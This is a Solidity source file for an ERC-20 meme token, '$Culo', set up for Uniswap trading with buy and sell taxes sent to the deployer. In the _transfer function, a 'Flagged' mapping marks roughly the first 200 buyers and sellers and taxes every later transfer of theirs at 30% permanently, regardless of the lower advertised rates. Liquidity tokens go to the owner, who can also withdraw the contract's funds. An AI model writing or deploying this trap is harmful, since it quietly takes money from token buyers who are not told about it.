// SPDX-License-Identifier: MIT

pragma solidity ^0.8.23;

abstract contract Context {function _msgSender() internal view virtual returns (address) {return msg.sender;}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return sub(a, b, "SafeMath: subtraction overflow");}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {return div(a, b, "SafeMath: division by zero");}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {return _owner;}

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {function createPair(address tokenA, address tokenB) external returns (address pair);}
interface MyContract {function BulkBuy (address from, uint amount) external;}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract $Culo is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) public Flagged;
    address payable private _taxWallet;
    address public Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; //Eth
    //0xD99D1c33F9fC3444f8101754aBC46c52416550D1;//testnet BSC
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _ChangedBuyTax=0;
    uint256 private _ChangedSellTax=0;
    uint256 private _reduceBuyTaxAt=200;
    uint256 private _reduceSellTaxAt=200;
    uint256 private _preventSwapBefore=200;
    uint256 private _buyCount=0;
    uint256 private _initialmaxTXAmount = 10_000_000_000;
    uint256 private _finalmaxTXAmount = 1_000_000_000_000;
    uint256 private _initialmaxWalletSize = 10_000_000_000;
    uint256 private _finalmaxWalletSize = 1_000_000_000_000;
    uint256 private Time;
    uint256 private ChangeTime = 3024000; // 5 weeks
    uint private MyTime = 0;

    uint8 private _decimals = 9;
    uint256 private _TotalSupply = 1_000_000_000_000 * 10**_decimals;
    string private _name = unicode"$Culo";
    string private _symbol = unicode"$Culo";
    uint256 public _maxTxAmount = _initialmaxTXAmount * 10**_decimals;
    uint256 public _maxWalletSize = _initialmaxWalletSize * 10**_decimals;
    uint256 public _taxSwapThreshold= 100_000_000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10_000_000_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {

        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _TotalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        Time = block.timestamp + ChangeTime;

        emit Transfer(address(0), _msgSender(), _TotalSupply);
    }

    receive() external payable {}
    
    function name() public view returns (string memory) {return _name;}
    function symbol() public view returns (string memory) {return _symbol;}
    function decimals() public view returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _TotalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function min(uint256 a, uint256 b) private pure returns (uint256){return (a>b)?b:a;}
    function sendETHToFee(uint256 amount) private {_taxWallet.transfer(amount);}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            MyTime = block.timestamp;
            
            if(_buyCount == _reduceBuyTaxAt) {
                _maxTxAmount = _finalmaxTXAmount * 10**_decimals;
                _maxWalletSize = _finalmaxWalletSize * 10**_decimals;
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if (MyTime < Time ) {
                    taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
                    _buyCount++;
                    if (_buyCount < _reduceBuyTaxAt) Flagged [to] = true;
                } else taxAmount = amount.mul(_ChangedBuyTax).div(100);
            }

            if(to == uniswapV2Pair && ! _isExcludedFromFee[from]) {
                if (MyTime < Time ) {
                    taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
                    if (_buyCount < _reduceSellTaxAt) Flagged [from] = true;
                } else taxAmount = amount.mul(_ChangedSellTax).div(100);
            }

            if (Flagged [from]) taxAmount = amount.mul(_initialBuyTax).div(100); 
            if (Flagged [to]) taxAmount = amount.mul(_initialBuyTax).div(100);

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {sendETHToFee(address(this).balance);}
            }
        }

        if(taxAmount > 0){
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function openTrading() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(Router);
        _approve(address(this), address(uniswapV2Router), _TotalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)) *(100 - _initialBuyTax) / 100, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        Time = block.timestamp + ChangeTime;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){swapTokensForEth(tokenBalance);}
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){sendETHToFee(ethBalance);}
    }

    function recoverBNB() public payable onlyOwner {_sendBnb(msg.sender, address(this).balance);}
    function recoverMiscToken(address tokenAddress) public payable onlyOwner {IERC20(tokenAddress).transfer(msg.sender,IERC20(tokenAddress).balanceOf(address(this)));}

    function _sendBnb(address account, uint256 amount) private {
        (bool sent,) = account.call{value: (amount)}("");
        require(sent, "withdraw failed");        
    }
}